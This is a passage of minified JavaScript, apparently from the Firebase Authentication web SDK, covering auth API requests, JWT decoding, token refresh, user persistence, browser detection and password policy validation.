    ? Object.assign(Object.assign({}, e), { tenantId: n.tenantId })
    : e;
}
async function Xe(n, e, t, r, i = {}) {
  return Ks(n, i, async () => {
    let o = {},
      s = {};
    r && ("GET" === e ? (s = r) : (o = { body: JSON.stringify(r) }));
    const a = en(Object.assign({ key: n.config.apiKey }, s)).slice(1),
      l = await n._getAdditionalHeaders();
    return (
      (l["Content-Type"] = "application/json"),
      n.languageCode && (l["X-Firebase-Locale"] = n.languageCode),
      Gs.fetch()(
        Ys(n, n.config.apiHost, t, a),
        Object.assign(
          { method: e, headers: l, referrerPolicy: "no-referrer" },
          o
        )
      )
    );
  });
}
async function Ks(n, e, t) {
  n._canInitEmulator = !1;
  const r = Object.assign(Object.assign({}, cu), e);
  try {
    const i = new fu(n),
      o = await Promise.race([t(), i.promise]);
    i.clearNetworkTimeout();
    const s = await o.json();
    if ("needConfirmation" in s)
      throw dn(n, "account-exists-with-different-credential", s);
    if (o.ok && !("errorMessage" in s)) return s;
    {
      const a = o.ok ? s.errorMessage : s.error.message,
        [l, c] = a.split(" : ");
      if ("FEDERATED_USER_ID_ALREADY_LINKED" === l)
        throw dn(n, "credential-already-in-use", s);
      if ("EMAIL_EXISTS" === l) throw dn(n, "email-already-in-use", s);
      if ("USER_DISABLED" === l) throw dn(n, "user-disabled", s);
      const d = r[l] || l.toLowerCase().replace(/[_\s]+/g, "-");
      if (c) throw vr(n, d, c);
      Pe(n, d);
    }
  } catch (i) {
    if (i instanceof ze) throw i;
    Pe(n, "network-request-failed", { message: String(i) });
  }
}
async function xn(n, e, t, r, i = {}) {
  const o = await Xe(n, e, t, r, i);
  return (
    "mfaPendingCredential" in o &&
      Pe(n, "multi-factor-auth-required", { _serverResponse: o }),
    o
  );
}
function Ys(n, e, t, r) {
  const i = `${e}${t}?${r}`;
  return n.config.emulator ? Ir(n.config, i) : `${n.config.apiScheme}://${i}`;
}
function du(n) {
  switch (n) {
    case "ENFORCE":
      return "ENFORCE";
    case "AUDIT":
      return "AUDIT";
    case "OFF":
      return "OFF";
    default:
      return "ENFORCEMENT_STATE_UNSPECIFIED";
  }
}
class fu {
  constructor(e) {
    (this.auth = e),
      (this.timer = null),
      (this.promise = new Promise((t, r) => {
        this.timer = setTimeout(
          () => r(Oe(this.auth, "network-request-failed")),
          uu.get()
        );
      }));
  }
  clearNetworkTimeout() {
    clearTimeout(this.timer);
  }
}
function dn(n, e, t) {
  const r = { appName: n.name };
  t.email && (r.email = t.email),
    t.phoneNumber && (r.phoneNumber = t.phoneNumber);
  const i = Oe(n, e, r);
  return (i.customData._tokenResponse = t), i;
}
function ci(n) {
  return void 0 !== n && void 0 !== n.enterprise;
}
class pu {
  constructor(e) {
    if (
      ((this.siteKey = ""),
      (this.recaptchaEnforcementState = []),
      void 0 === e.recaptchaKey)
    )
      throw new Error("recaptchaKey undefined");
    (this.siteKey = e.recaptchaKey.split("/")[3]),
      (this.recaptchaEnforcementState = e.recaptchaEnforcementState);
  }
  getProviderEnforcementState(e) {
    if (
      !this.recaptchaEnforcementState ||
      0 === this.recaptchaEnforcementState.length
    )
      return null;
    for (const t of this.recaptchaEnforcementState)
      if (t.provider && t.provider === e) return du(t.enforcementState);
    return null;
  }
  isProviderEnabled(e) {
    return (
      "ENFORCE" === this.getProviderEnforcementState(e) ||
      "AUDIT" === this.getProviderEnforcementState(e)
    );
  }
}
async function hu(n, e) {
  return Xe(n, "GET", "/v2/recaptchaConfig", lt(n, e));
}
async function mu(n, e) {
  return Xe(n, "POST", "/v1/accounts:delete", e);
}
async function Js(n, e) {
  return Xe(n, "POST", "/v1/accounts:lookup", e);
}
function qt(n) {
  if (n)
    try {
      const e = new Date(Number(n));
      if (!isNaN(e.getTime())) return e.toUTCString();
    } catch {}
}
async function gu(n, e = !1) {
  const t = Le(n),
    r = await t.getIdToken(e),
    i = Er(r);
  F(i && i.exp && i.auth_time && i.iat, t.auth, "internal-error");
  const o = "object" == typeof i.firebase ? i.firebase : void 0,
    s = null == o ? void 0 : o.sign_in_provider;
  return {
    claims: i,
    token: r,
    authTime: qt(Gn(i.auth_time)),
    issuedAtTime: qt(Gn(i.iat)),
    expirationTime: qt(Gn(i.exp)),
    signInProvider: s || null,
    signInSecondFactor: (null == o ? void 0 : o.sign_in_second_factor) || null,
  };
}
function Gn(n) {
  return 1e3 * Number(n);
}
function Er(n) {
  const [e, t, r] = n.split(".");
  if (void 0 === e || void 0 === t || void 0 === r)
    return pn("JWT malformed, contained fewer than 3 sections"), null;
  try {
    const i = Os(t);
    return i
      ? JSON.parse(i)
      : (pn("Failed to decode base64 JWT payload"), null);
  } catch (i) {
    return (
      pn(
        "Caught error parsing JWT payload as JSON",
        null == i ? void 0 : i.toString()
      ),
      null
    );
  }
}
function ui(n) {
  const e = Er(n);
  return (
    F(e, "internal-error"),
    F(typeof e.exp < "u", "internal-error"),
    F(typeof e.iat < "u", "internal-error"),
    Number(e.exp) - Number(e.iat)
  );
}
async function Jt(n, e, t = !1) {
  if (t) return e;
  try {
    return await e;
  } catch (r) {
    throw (
      (r instanceof ze &&
        bu(r) &&
        n.auth.currentUser === n &&
        (await n.auth.signOut()),
      r)
    );
  }
}
function bu({ code: n }) {
  return "auth/user-disabled" === n || "auth/user-token-expired" === n;
}
class wu {
  constructor(e) {
    (this.user = e),
      (this.isRunning = !1),
      (this.timerId = null),
      (this.errorBackoff = 3e4);
  }
  _start() {
    this.isRunning || ((this.isRunning = !0), this.schedule());
  }
  _stop() {
    !this.isRunning ||
      ((this.isRunning = !1),
      null !== this.timerId && clearTimeout(this.timerId));
  }
  getInterval(e) {
    var t;
    if (e) {
      const r = this.errorBackoff;
      return (this.errorBackoff = Math.min(2 * this.errorBackoff, 96e4)), r;
    }
    {
      this.errorBackoff = 3e4;
      const i =
        (null !== (t = this.user.stsTokenManager.expirationTime) && void 0 !== t
          ? t
          : 0) -
        Date.now() -
        3e5;
      return Math.max(0, i);
    }
  }
  schedule(e = !1) {
    if (!this.isRunning) return;
    const t = this.getInterval(e);
    this.timerId = setTimeout(async () => {
      await this.iteration();
    }, t);
  }
  async iteration() {
    try {
      await this.user.getIdToken(!0);
    } catch (e) {
      return void (
        "auth/network-request-failed" === (null == e ? void 0 : e.code) &&
        this.schedule(!0)
      );
    }
    this.schedule();
  }
}
class cr {
  constructor(e, t) {
    (this.createdAt = e), (this.lastLoginAt = t), this._initializeTime();
  }
  _initializeTime() {
    (this.lastSignInTime = qt(this.lastLoginAt)),
      (this.creationTime = qt(this.createdAt));
  }
  _copy(e) {
    (this.createdAt = e.createdAt),
      (this.lastLoginAt = e.lastLoginAt),
      this._initializeTime();
  }
  toJSON() {
    return { createdAt: this.createdAt, lastLoginAt: this.lastLoginAt };
  }
}
async function kn(n) {
  var e;
  const t = n.auth,
    r = await n.getIdToken(),
    i = await Jt(n, Js(t, { idToken: r }));
  F(null == i ? void 0 : i.users.length, t, "internal-error");
  const o = i.users[0];
  n._notifyReloadListener(o);
  const s =
      null !== (e = o.providerUserInfo) && void 0 !== e && e.length
        ? Xs(o.providerUserInfo)
        : [],
    a = yu(n.providerData, s),
    l = n.isAnonymous,
    c = !((n.email && o.passwordHash) || (null != a && a.length)),
    d = !!l && c,
    u = {
      uid: o.localId,
      displayName: o.displayName || null,
      photoURL: o.photoUrl || null,
      email: o.email || null,
      emailVerified: o.emailVerified || !1,
      phoneNumber: o.phoneNumber || null,
      tenantId: o.tenantId || null,
      providerData: a,
      metadata: new cr(o.createdAt, o.lastLoginAt),
      isAnonymous: d,
    };
  Object.assign(n, u);
}
async function _u(n) {
  const e = Le(n);
  await kn(e),
    await e.auth._persistUserIfCurrent(e),
    e.auth._notifyListenersIfCurrent(e);
}
function yu(n, e) {
  return [
    ...n.filter((r) => !e.some((i) => i.providerId === r.providerId)),
    ...e,
  ];
}
function Xs(n) {
  return n.map((e) => {
    var { providerId: t } = e,
      r = yr(e, ["providerId"]);
    return {
      providerId: t,
      uid: r.rawId || "",
      displayName: r.displayName || null,
      email: r.email || null,
      phoneNumber: r.phoneNumber || null,
      photoURL: r.photoUrl || null,
    };
  });
}
async function vu(n, e) {
  const t = await Ks(n, {}, async () => {
    const r = en({ grant_type: "refresh_token", refresh_token: e }).slice(1),
      { tokenApiHost: i, apiKey: o } = n.config,
      s = Ys(n, i, "/v1/token", `key=${o}`),
      a = await n._getAdditionalHeaders();
    return (
      (a["Content-Type"] = "application/x-www-form-urlencoded"),
      Gs.fetch()(s, { method: "POST", headers: a, body: r })
    );
  });
  return {
    accessToken: t.access_token,
    expiresIn: t.expires_in,
    refreshToken: t.refresh_token,
  };
}
async function ku(n, e) {
  return Xe(n, "POST", "/v2/accounts:revokeToken", lt(n, e));
}
class St {
  constructor() {
    (this.refreshToken = null),
      (this.accessToken = null),
      (this.expirationTime = null);
  }
  get isExpired() {
    return !this.expirationTime || Date.now() > this.expirationTime - 3e4;
  }
  updateFromServerResponse(e) {
    F(e.idToken, "internal-error"),
      F(typeof e.idToken < "u", "internal-error"),
      F(typeof e.refreshToken < "u", "internal-error");
    const t =
      "expiresIn" in e && typeof e.expiresIn < "u"
        ? Number(e.expiresIn)
        : ui(e.idToken);
    this.updateTokensAndExpiration(e.idToken, e.refreshToken, t);
  }
  updateFromIdToken(e) {
    F(0 !== e.length, "internal-error");
    const t = ui(e);
    this.updateTokensAndExpiration(e, null, t);
  }
  async getToken(e, t = !1) {
    return t || !this.accessToken || this.isExpired
      ? (F(this.refreshToken, e, "user-token-expired"),
        this.refreshToken
          ? (await this.refresh(e, this.refreshToken), this.accessToken)
          : null)
      : this.accessToken;
  }
  clearRefreshToken() {
    this.refreshToken = null;
  }
  async refresh(e, t) {
    const { accessToken: r, refreshToken: i, expiresIn: o } = await vu(e, t);
    this.updateTokensAndExpiration(r, i, Number(o));
  }
  updateTokensAndExpiration(e, t, r) {
    (this.refreshToken = t || null),
      (this.accessToken = e || null),
      (this.expirationTime = Date.now() + 1e3 * r);
  }
  static fromJSON(e, t) {
    const { refreshToken: r, accessToken: i, expirationTime: o } = t,
      s = new St();
    return (
      r &&
        (F("string" == typeof r, "internal-error", { appName: e }),
        (s.refreshToken = r)),
      i &&
        (F("string" == typeof i, "internal-error", { appName: e }),
        (s.accessToken = i)),
      o &&
        (F("number" == typeof o, "internal-error", { appName: e }),
        (s.expirationTime = o)),
      s
    );
  }
  toJSON() {
    return {
      refreshToken: this.refreshToken,
      accessToken: this.accessToken,
      expirationTime: this.expirationTime,
    };
  }
  _assign(e) {
    (this.accessToken = e.accessToken),
      (this.refreshToken = e.refreshToken),
      (this.expirationTime = e.expirationTime);
  }
  _clone() {
    return Object.assign(new St(), this.toJSON());
  }
  _performRefresh() {
    return qe("not implemented");
  }
}
function Qe(n, e) {
  F("string" == typeof n || typeof n > "u", "internal-error", { appName: e });
}
class We {
  constructor(e) {
    var { uid: t, auth: r, stsTokenManager: i } = e,
      o = yr(e, ["uid", "auth", "stsTokenManager"]);
    (this.providerId = "firebase"),
      (this.proactiveRefresh = new wu(this)),
      (this.reloadUserInfo = null),
      (this.reloadListener = null),
      (this.uid = t),
      (this.auth = r),
      (this.stsTokenManager = i),
      (this.accessToken = i.accessToken),
      (this.displayName = o.displayName || null),
      (this.email = o.email || null),
      (this.emailVerified = o.emailVerified || !1),
      (this.phoneNumber = o.phoneNumber || null),
      (this.photoURL = o.photoURL || null),
      (this.isAnonymous = o.isAnonymous || !1),
      (this.tenantId = o.tenantId || null),
      (this.providerData = o.providerData ? [...o.providerData] : []),
      (this.metadata = new cr(o.createdAt || void 0, o.lastLoginAt || void 0));
  }
  async getIdToken(e) {
    const t = await Jt(this, this.stsTokenManager.getToken(this.auth, e));
    return (
      F(t, this.auth, "internal-error"),
      this.accessToken !== t &&
        ((this.accessToken = t),
        await this.auth._persistUserIfCurrent(this),
        this.auth._notifyListenersIfCurrent(this)),
      t
    );
  }
  getIdTokenResult(e) {
    return gu(this, e);
  }
  reload() {
    return _u(this);
  }
  _assign(e) {
    this !== e &&
      (F(this.uid === e.uid, this.auth, "internal-error"),
      (this.displayName = e.displayName),
      (this.photoURL = e.photoURL),
      (this.email = e.email),
      (this.emailVerified = e.emailVerified),
      (this.phoneNumber = e.phoneNumber),
      (this.isAnonymous = e.isAnonymous),
      (this.tenantId = e.tenantId),
      (this.providerData = e.providerData.map((t) => Object.assign({}, t))),
      this.metadata._copy(e.metadata),
      this.stsTokenManager._assign(e.stsTokenManager));
  }
  _clone(e) {
    const t = new We(
      Object.assign(Object.assign({}, this), {
        auth: e,
        stsTokenManager: this.stsTokenManager._clone(),
      })
    );
    return t.metadata._copy(this.metadata), t;
  }
  _onReload(e) {
    F(!this.reloadListener, this.auth, "internal-error"),
      (this.reloadListener = e),
      this.reloadUserInfo &&
        (this._notifyReloadListener(this.reloadUserInfo),
        (this.reloadUserInfo = null));
  }
  _notifyReloadListener(e) {
    this.reloadListener ? this.reloadListener(e) : (this.reloadUserInfo = e);
  }
  _startProactiveRefresh() {
    this.proactiveRefresh._start();
  }
  _stopProactiveRefresh() {
    this.proactiveRefresh._stop();
  }
  async _updateTokensIfNecessary(e, t = !1) {
    let r = !1;
    e.idToken &&
      e.idToken !== this.stsTokenManager.accessToken &&
      (this.stsTokenManager.updateFromServerResponse(e), (r = !0)),
      t && (await kn(this)),
      await this.auth._persistUserIfCurrent(this),
      r && this.auth._notifyListenersIfCurrent(this);
  }
  async delete() {
    if (De(this.auth.app)) return Promise.reject(ot(this.auth));
    const e = await this.getIdToken();
    return (
      await Jt(this, mu(this.auth, { idToken: e })),
      this.stsTokenManager.clearRefreshToken(),
      this.auth.signOut()
    );
  }
  toJSON() {
    return Object.assign(
      Object.assign(
        {
          uid: this.uid,
          email: this.email || void 0,
          emailVerified: this.emailVerified,
          displayName: this.displayName || void 0,
          isAnonymous: this.isAnonymous,
          photoURL: this.photoURL || void 0,
          phoneNumber: this.phoneNumber || void 0,
          tenantId: this.tenantId || void 0,
          providerData: this.providerData.map((e) => Object.assign({}, e)),
          stsTokenManager: this.stsTokenManager.toJSON(),
          _redirectEventId: this._redirectEventId,
        },
        this.metadata.toJSON()
      ),
      { apiKey: this.auth.config.apiKey, appName: this.auth.name }
    );
  }
  get refreshToken() {
    return this.stsTokenManager.refreshToken || "";
  }
  static _fromJSON(e, t) {
    var r, i, o, s, a, l, c, d;
    const u = null !== (r = t.displayName) && void 0 !== r ? r : void 0,
      f = null !== (i = t.email) && void 0 !== i ? i : void 0,
      m = null !== (o = t.phoneNumber) && void 0 !== o ? o : void 0,
      y = null !== (s = t.photoURL) && void 0 !== s ? s : void 0,
      I = null !== (a = t.tenantId) && void 0 !== a ? a : void 0,
      v = null !== (l = t._redirectEventId) && void 0 !== l ? l : void 0,
      R = null !== (c = t.createdAt) && void 0 !== c ? c : void 0,
      L = null !== (d = t.lastLoginAt) && void 0 !== d ? d : void 0,
      {
        uid: _,
        emailVerified: P,
        isAnonymous: te,
        providerData: ne,
        stsTokenManager: D,
      } = t;
    F(_ && D, e, "internal-error");
    const z = St.fromJSON(this.name, D);
    F("string" == typeof _, e, "internal-error"),
      Qe(u, e.name),
      Qe(f, e.name),
      F("boolean" == typeof P, e, "internal-error"),
      F("boolean" == typeof te, e, "internal-error"),
      Qe(m, e.name),
      Qe(y, e.name),
      Qe(I, e.name),
      Qe(v, e.name),
      Qe(R, e.name),
      Qe(L, e.name);
    const B = new We({
      uid: _,
      auth: e,
      email: f,
      emailVerified: P,
      displayName: u,
      isAnonymous: te,
      photoURL: y,
      phoneNumber: m,
      tenantId: I,
      stsTokenManager: z,
      createdAt: R,
      lastLoginAt: L,
    });
    return (
      ne &&
        Array.isArray(ne) &&
        (B.providerData = ne.map((q) => Object.assign({}, q))),
      v && (B._redirectEventId = v),
      B
    );
  }
  static async _fromIdTokenResponse(e, t, r = !1) {
    const i = new St();
    i.updateFromServerResponse(t);
    const o = new We({
      uid: t.localId,
      auth: e,
      stsTokenManager: i,
      isAnonymous: r,
    });
    return await kn(o), o;
  }
  static async _fromGetAccountInfoResponse(e, t, r) {
    const i = t.users[0];
    F(void 0 !== i.localId, "internal-error");
    const o = void 0 !== i.providerUserInfo ? Xs(i.providerUserInfo) : [],
      s = !((i.email && i.passwordHash) || (null != o && o.length)),
      a = new St();
    a.updateFromIdToken(r);
    const l = new We({
        uid: i.localId,
        auth: e,
        stsTokenManager: a,
        isAnonymous: s,
      }),
      c = {
        uid: i.localId,
        displayName: i.displayName || null,
        photoURL: i.photoUrl || null,
        email: i.email || null,
        emailVerified: i.emailVerified || !1,
        phoneNumber: i.phoneNumber || null,
        tenantId: i.tenantId || null,
        providerData: o,
        metadata: new cr(i.createdAt, i.lastLoginAt),
        isAnonymous: !((i.email && i.passwordHash) || (null != o && o.length)),
      };
    return Object.assign(l, c), l;
  }
}
const di = new Map();
function Ge(n) {
  Ye(n instanceof Function, "Expected a class definition");
  let e = di.get(n);
  return e
    ? (Ye(e instanceof n, "Instance stored in cache mismatched with class"), e)
    : ((e = new n()), di.set(n, e), e);
}
class Zs {
  constructor() {
    (this.type = "NONE"), (this.storage = {});
  }
  async _isAvailable() {
    return !0;
  }
  async _set(e, t) {
    this.storage[e] = t;
  }
  async _get(e) {
    const t = this.storage[e];
    return void 0 === t ? null : t;
  }
  async _remove(e) {
    delete this.storage[e];
  }
  _addListener(e, t) {}
  _removeListener(e, t) {}
}
Zs.type = "NONE";
const fi = Zs;
function hn(n, e, t) {
  return `firebase:${n}:${e}:${t}`;
}
class Ct {
  constructor(e, t, r) {
    (this.persistence = e), (this.auth = t), (this.userKey = r);
    const { config: i, name: o } = this.auth;
    (this.fullUserKey = hn(this.userKey, i.apiKey, o)),
      (this.fullPersistenceKey = hn("persistence", i.apiKey, o)),
      (this.boundEventHandler = t._onStorageEvent.bind(t)),
      this.persistence._addListener(this.fullUserKey, this.boundEventHandler);
  }
  setCurrentUser(e) {
    return this.persistence._set(this.fullUserKey, e.toJSON());
  }
  async getCurrentUser() {
    const e = await this.persistence._get(this.fullUserKey);
    return e ? We._fromJSON(this.auth, e) : null;
  }
  removeCurrentUser() {
    return this.persistence._remove(this.fullUserKey);
  }
  savePersistenceForRedirect() {
    return this.persistence._set(
      this.fullPersistenceKey,
      this.persistence.type
    );
  }
  async setPersistence(e) {
    if (this.persistence === e) return;
    const t = await this.getCurrentUser();
    return (
      await this.removeCurrentUser(),
      (this.persistence = e),
      t ? this.setCurrentUser(t) : void 0
    );
  }
  delete() {
    this.persistence._removeListener(this.fullUserKey, this.boundEventHandler);
  }
  static async create(e, t, r = "authUser") {
    if (!t.length) return new Ct(Ge(fi), e, r);
    const i = (
      await Promise.all(
        t.map(async (c) => {
          if (await c._isAvailable()) return c;
        })
      )
    ).filter((c) => c);
    let o = i[0] || Ge(fi);
    const s = hn(r, e.config.apiKey, e.name);
    let a = null;
    for (const c of t)
      try {
        const d = await c._get(s);
        if (d) {
          const u = We._fromJSON(e, d);
          c !== o && (a = u), (o = c);
          break;
        }
      } catch {}
    const l = i.filter((c) => c._shouldAllowMigration);
    return o._shouldAllowMigration && l.length
      ? ((o = l[0]),
        a && (await o._set(s, a.toJSON())),
        await Promise.all(
          t.map(async (c) => {
            if (c !== o)
              try {
                await c._remove(s);
              } catch {}
          })
        ),
        new Ct(o, e, r))
      : new Ct(o, e, r);
  }
}
function pi(n) {
  const e = n.toLowerCase();
  if (e.includes("opera/") || e.includes("opr/") || e.includes("opios/"))
    return "Opera";
  if (ta(e)) return "IEMobile";
  if (e.includes("msie") || e.includes("trident/")) return "IE";
  if (e.includes("edge/")) return "Edge";
  if (Qs(e)) return "Firefox";
  if (e.includes("silk/")) return "Silk";
  if (ra(e)) return "Blackberry";
  if (ia(e)) return "Webos";
  if (Tr(e)) return "Safari";
  if ((e.includes("chrome/") || ea(e)) && !e.includes("edge/")) return "Chrome";
  if (na(e)) return "Android";
  {
    const t = /([a-zA-Z\d\.]+)\/[a-zA-Z\d\.]*$/,
      r = n.match(t);
    if (2 === (null == r ? void 0 : r.length)) return r[1];
  }
  return "Other";
}
function Qs(n = ve()) {
  return /firefox\//i.test(n);
}
function Tr(n = ve()) {
  const e = n.toLowerCase();
  return (
    e.includes("safari/") &&
    !e.includes("chrome/") &&
    !e.includes("crios/") &&
    !e.includes("android")
  );
}
function ea(n = ve()) {
  return /crios\//i.test(n);
}
function ta(n = ve()) {
  return /iemobile/i.test(n);
}
function na(n = ve()) {
  return /android/i.test(n);
}
function ra(n = ve()) {
  return /blackberry/i.test(n);
}
function ia(n = ve()) {
  return /webos/i.test(n);
}
function On(n = ve()) {
  return (
    /iphone|ipad|ipod/i.test(n) || (/macintosh/i.test(n) && /mobile/i.test(n))
  );
}
function Iu(n = ve()) {
  var e;
  return (
    On(n) && !(null === (e = window.navigator) || void 0 === e || !e.standalone)
  );
}
function Eu() {
  return Dl() && 10 === document.documentMode;
}
function oa(n = ve()) {
  return On(n) || na(n) || ia(n) || ra(n) || /windows phone/i.test(n) || ta(n);
}
function Tu() {
  try {
    return !(!window || window === window.top);
  } catch {
    return !1;
  }
}
function sa(n, e = []) {
  let t;
  switch (n) {
    case "Browser":
      t = pi(ve());
      break;
    case "Worker":
      t = `${pi(ve())}-${n}`;
      break;
    default:
      t = n;
  }
  const r = e.length ? e.join(",") : "FirebaseCore-web";
  return `${t}/JsCore/${tn}/${r}`;
}
class Su {
  constructor(e) {
    (this.auth = e), (this.queue = []);
  }
  pushCallback(e, t) {
    const r = (o) =>
      new Promise((s, a) => {
        try {
          s(e(o));
        } catch (l) {
          a(l);
        }
      });
    (r.onAbort = t), this.queue.push(r);
    const i = this.queue.length - 1;
    return () => {
      this.queue[i] = () => Promise.resolve();
    };
  }
  async runMiddleware(e) {
    if (this.auth.currentUser === e) return;
    const t = [];
    try {
      for (const r of this.queue) await r(e), r.onAbort && t.push(r.onAbort);
    } catch (r) {
      t.reverse();
      for (const i of t)
        try {
          i();
        } catch {}
      throw this.auth._errorFactory.create("login-blocked", {
        originalMessage: null == r ? void 0 : r.message,
      });
    }
  }
}
async function Cu(n, e = {}) {
  return Xe(n, "GET", "/v2/passwordPolicy", lt(n, e));
}
const Au = 6;
class Ru {
  constructor(e) {
    var t, r, i, o;
    const s = e.customStrengthOptions;
    (this.customStrengthOptions = {}),
      (this.customStrengthOptions.minPasswordLength =
        null !== (t = s.minPasswordLength) && void 0 !== t ? t : 6),
      s.maxPasswordLength &&
        (this.customStrengthOptions.maxPasswordLength = s.maxPasswordLength),
      void 0 !== s.containsLowercaseCharacter &&
        (this.customStrengthOptions.containsLowercaseLetter =
          s.containsLowercaseCharacter),
      void 0 !== s.containsUppercaseCharacter &&
        (this.customStrengthOptions.containsUppercaseLetter =
          s.containsUppercaseCharacter),
      void 0 !== s.containsNumericCharacter &&
        (this.customStrengthOptions.containsNumericCharacter =
          s.containsNumericCharacter),
      void 0 !== s.containsNonAlphanumericCharacter &&
        (this.customStrengthOptions.containsNonAlphanumericCharacter =
          s.containsNonAlphanumericCharacter),
      (this.enforcementState = e.enforcementState),
      "ENFORCEMENT_STATE_UNSPECIFIED" === this.enforcementState &&
        (this.enforcementState = "OFF"),
      (this.allowedNonAlphanumericCharacters =
        null !==
          (i =
            null === (r = e.allowedNonAlphanumericCharacters) || void 0 === r
              ? void 0
              : r.join("")) && void 0 !== i
          ? i
          : ""),
      (this.forceUpgradeOnSignin =
        null !== (o = e.forceUpgradeOnSignin) && void 0 !== o && o),
      (this.schemaVersion = e.schemaVersion);
  }
  validatePassword(e) {
    var t, r, i, o, s, a;
    const l = { isValid: !0, passwordPolicy: this };
    return (
      this.validatePasswordLengthOptions(e, l),
      this.validatePasswordCharacterOptions(e, l),
      l.isValid &&
        (l.isValid =
          null === (t = l.meetsMinPasswordLength) || void 0 === t || t),
      l.isValid &&
        (l.isValid =
          null === (r = l.meetsMaxPasswordLength) || void 0 === r || r),
      l.isValid &&
        (l.isValid =
          null === (i = l.containsLowercaseLetter) || void 0 === i || i),
      l.isValid &&
        (l.isValid =
          null === (o = l.containsUppercaseLetter) || void 0 === o || o),
      l.isValid &&
        (l.isValid =
          null === (s = l.containsNumericCharacter) || void 0 === s || s),
      l.isValid &&
        (l.isValid =
          null === (a = l.containsNonAlphanumericCharacter) ||
          void 0 === a ||
          a),
      l
    );
  }
  validatePasswordLengthOptions(e, t) {
    const r = this.customStrengthOptions.minPasswordLength,
      i = this.customStrengthOptions.maxPasswordLength;
    r && (t.meetsMinPasswordLength = e.length >= r),
      i && (t.meetsMaxPasswordLength = e.length <= i);
  }
  validatePasswordCharacterOptions(e, t) {
    let r;
    this.updatePasswordCharacterOptionsStatuses(t, !1, !1, !1, !1);
    for (let i = 0; i < e.length; i++)
      (r = e.charAt(i)),
        this.updatePasswordCharacterOptionsStatuses(
          t,
          r >= "a" && r <= "z",
          r >= "A" && r <= "Z",
          r >= "0" && r <= "9",
          this.allowedNonAlphanumericCharacters.includes(r)
        );
  }
  updatePasswordCharacterOptionsStatuses(e, t, r, i, o) {
    this.customStrengthOptions.containsLowercaseLetter &&
      (e.containsLowercaseLetter || (e.containsLowercaseLetter = t)),
      this.customStrengthOptions.containsUppercaseLetter &&
        (e.containsUppercaseLetter || (e.containsUppercaseLetter = r)),
      this.customStrengthOptions.containsNumericCharacter &&
        (e.containsNumericCharacter || (e.containsNumericCharacter = i)),
      this.customStrengthOptions.containsNonAlphanumericCharacter &&
        (e.containsNonAlphanumericCharacter ||
          (e.containsNonAlphanumericCharacter = o));
  }
}
class Pu {
  constructor(e, t, r, i) {
    (this.app = e),
      (this.heartbeatServiceProvider = t),
      (this.appCheckServiceProvider = r),
      (this.config = i),
      (this.currentUser = null),
      (this.emulatorConfig = null),
      (this.operations = Promise.resolve()),
      (this.authStateSubscription = new hi(this)),
      (this.idTokenSubscription = new hi(this)),
      (this.beforeStateQueue = new Su(this)),
      (this.redirectUser = null),
      (this.isProactiveRefreshEnabled = !1),
      (this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION = 1),
      (this._canInitEmulator = !0),
      (this._isInitialized = !1),
      (this._deleted = !1),
      (this._initializationPromise = null),
      (this._popupRedirectResolver = null),
      (this._errorFactory = Ws),
      (this._agentRecaptchaConfig = null),
      (this._tenantRecaptchaConfigs = {}),
      (this._projectPasswordPolicy = null),
      (this._tenantPasswordPolicies = {}),
      (this.lastNotifiedUid = void 0),
      (this.languageCode = null),
      (this.tenantId = null),
      (this.settings = { appVerificationDisabledForTesting: !1 }),
      (this.frameworks = []),
      (this.name = e.name),
      (this.clientVersion = i.sdkClientVersion);
  }
  _initializeWithPersistence(e, t) {
    return (
      t && (this._popupRedirectResolver = Ge(t)),
      (this._initializationPromise = this.queue(async () => {
        var r, i;
        if (
          !this._deleted &&
          ((this.persistenceManager = await Ct.create(this, e)), !this._deleted)
        ) {
          if (
            null !== (r = this._popupRedirectResolver) &&
            void 0 !== r &&
            r._shouldInitProactively
          )
            try {
              await this._popupRedirectResolver._initialize(this);
            } catch {}
          await this.initializeCurrentUser(t),
            (this.lastNotifiedUid =
              (null === (i = this.currentUser) || void 0 === i
                ? void 0
                : i.uid) || null),
            !this._deleted && (this._isInitialized = !0);
        }
      })),
      this._initializationPromise
    );
  }
  async _onStorageEvent() {
    if (this._deleted) return;
    const e = await this.assertedPersistence.getCurrentUser();
    if (this.currentUser || e) {
      if (this.currentUser && e && this.currentUser.uid === e.uid)
        return (
          this._currentUser._assign(e),
          void (await this.currentUser.getIdToken())
        );
      await this._updateCurrentUser(e, !0);
    }
  }
  async initializeCurrentUserFromIdToken(e) {
    try {
      const t = await Js(this, { idToken: e }),
        r = await We._fromGetAccountInfoResponse(this, t, e);
      await this.directlySetCurrentUser(r);
    } catch (t) {
      console.warn(
        "FirebaseServerApp could not login user with provided authIdToken: ",
        t
      ),
        await this.directlySetCurrentUser(null);
    }
  }
  async initializeCurrentUser(e) {
    var t;
    if (De(this.app)) {
      const s = this.app.settings.authIdToken;
      return s
        ? new Promise((a) => {
            setTimeout(() =>
              this.initializeCurrentUserFromIdToken(s).then(a, a)
            );
          })
        : this.directlySetCurrentUser(null);
    }
    const r = await this.assertedPersistence.getCurrentUser();
    let i = r,
      o = !1;
    if (e && this.config.authDomain) {
      await this.getOrInitRedirectPersistenceManager();
      const s =
          null === (t = this.redirectUser) || void 0 === t
            ? void 0
            : t._redirectEventId,
        a = null == i ? void 0 : i._redirectEventId,
        l = await this.tryRedirectSignIn(e);
      (!s || s === a) &&
        (null == l ? void 0 : l.user) &&
        ((i = l.user), (o = !0));
    }
    if (!i) return this.directlySetCurrentUser(null);
    if (!i._redirectEventId) {
      if (o)
        try {
          await this.beforeStateQueue.runMiddleware(i);
        } catch (s) {
          (i = r),
            this._popupRedirectResolver._overrideRedirectResult(this, () =>
              Promise.reject(s)
            );
        }
      return i
        ? this.reloadAndSetCurrentUserOrClear(i)
        : this.directlySetCurrentUser(null);
    }
    return (
      F(this._popupRedirectResolver, this, "argument-error"),
      await this.getOrInitRedirectPersistenceManager(),
      this.redirectUser &&
      this.redirectUser._redirectEventId === i._redirectEventId
        ? this.directlySetCurrentUser(i)
        : this.reloadAndSetCurrentUserOrClear(i)
    );
  }
  async tryRedirectSignIn(e) {
    let t = null;
    try {
      t = await this._popupRedirectResolver._completeRedirectFn(this, e, !0);
    } catch {
      await this._setRedirectUser(null);
    }
    return t;
  }
  async reloadAndSetCurrentUserOrClear(e) {
    try {
      await kn(e);
    } catch (t) {
      if ("auth/network-request-failed" !== (null == t ? void 0 : t.code))
        return this.directlySetCurrentUser(null);
    }
    return this.directlySetCurrentUser(e);
  }
  useDeviceLanguage() {
    this.languageCode = lu();
  }
  async _delete() {
    this._deleted = !0;
  }
  async updateCurrentUser(e) {
